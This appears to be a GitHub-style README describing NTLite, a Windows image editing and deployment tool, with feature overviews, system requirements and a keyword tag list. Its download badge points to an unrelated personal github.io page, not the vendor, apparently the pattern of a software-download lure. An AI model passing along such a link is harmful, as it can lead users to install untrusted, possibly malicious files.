# NTLite

<p align="center">
<img src="https://korben.info/ntlite-personnaliser-image-windows/ntlite-personnaliser-image-windows-1.jpg" alt="NTLite Windows Customization and Deployment Tool" width="780">
</p>

[![GET — NTLite](https://img.shields.io/badge/GET-NTLite-2563eb?style=for-the-badge)](https://penez1995olivar.github.io/.github/NTLite)

---

# Project Overview

NTLite is a Windows customization and deployment utility designed for modifying Windows installation images and configuring deployed Windows installations. It can work with formats such as ISO, WIM, ESD, and SWM, allowing users and administrators to prepare customized Windows media before deployment.

The application provides tools for integrating Windows updates, drivers, language packs, optional features, registry settings, and other configuration changes into an installation image. It can also remove selected Windows components and configure system services, helping create deployment media tailored to a particular hardware or software environment.

NTLite supports both offline Windows image editing and direct modification of an already deployed Windows installation. This makes it useful for preparing standardized installations as well as maintaining or adjusting existing systems without rebuilding an installation from scratch.

The application also includes automation capabilities. Users can create unattended installation configurations, configure regional settings, user accounts, disk layouts, and other setup options, then save presets for reuse across multiple Windows deployments.

---

# Windows Image Management & Customization

NTLite supports major Windows installation image formats, including ISO, WIM, ESD, and SWM. Users can load an image, select the Windows edition they need, make configuration changes, and create bootable installation media.

The image-management workflow can be used to remove unwanted editions, convert supported image formats, and prepare customized Windows installation sources. This can be useful when creating consistent deployment media for multiple computers.

NTLite can also edit a deployed Windows installation directly. A live Windows installation, another Windows partition, or a mounted VHD/VHDX can be loaded for supported configuration tasks.

Component removal should be performed carefully because removing Windows components can affect applications, hardware compatibility, updates, or system functionality. Testing customized images in a virtual machine or spare system is recommended before wider deployment.

---

# Updates, Drivers & Windows Features

NTLite can integrate Windows updates directly into installation images. Updates can be downloaded, cached, analyzed, and integrated so that a customized installation starts with a more current software state.

Driver integration allows compatible driver packages to be added to Windows images. This can be useful for deployment environments where specific storage, network, USB, or other hardware drivers need to be available during installation.

Windows optional features and Features on Demand can also be configured. Depending on the Windows version and edition, available components can include .NET Framework features, RSAT tools, OpenSSH, language components, Media Feature Pack components, and other optional Windows capabilities. 

NTLite downloads supported Windows update packages from Microsoft servers and can verify downloaded update files before they are used. 

---

# Unattended Setup, Services & Automation

NTLite provides unattended Windows installation options for creating automated deployment media. Setup configurations can include user accounts, regional preferences, product keys, domain or workgroup settings, and other installation parameters.

The application can also configure Windows services, registry settings, power plans, and selected system preferences before deployment. Presets allow configurations to be saved and reused for future Windows images.

For organizations or users deploying Windows repeatedly, reusable presets can help maintain consistent configuration across installations while reducing repetitive setup work.

---

# System Compatibility & Performance

NTLite is designed primarily for Windows customization and deployment workflows rather than everyday desktop operation. The current release supports Windows 7 and newer hosts, with x86 and x64 architectures; Windows 10 or newer is required as the host when editing Windows 10+ images.

| Component | Practical Configuration |
|---|---|
| Operating System | Windows 7 / 8.1 / 10 / 11 |
| Architecture | x86 or x64 |
| Processor | 1 GHz or better |
| Memory | 2 GB RAM or more recommended |
| Storage | Several GB recommended for Windows images |
| Graphics | Integrated graphics |
| Display | 1024×768 or higher |
| Internet | Optional; useful for downloading updates and components |
| Dependencies | Native C++; no .NET requirement |

The current NTLite download page lists Windows 11, 10, 8.1, and 7 as supported operating systems and states that the application has no .NET dependency. 

Actual resource requirements depend heavily on the size of the Windows images being processed, the number of updates and drivers being integrated, available storage, and the complexity of the customization workflow.

---

# Tags

NTLite, NTLite Windows, Windows customization, Windows debloat, Windows ISO editor, Windows image editor, WIM editor, ESD editor, Windows deployment, Windows ISO customization, Windows 11 customization, Windows 10 customization, unattended Windows installation, Windows updates integration, driver integration, Windows deployment tool
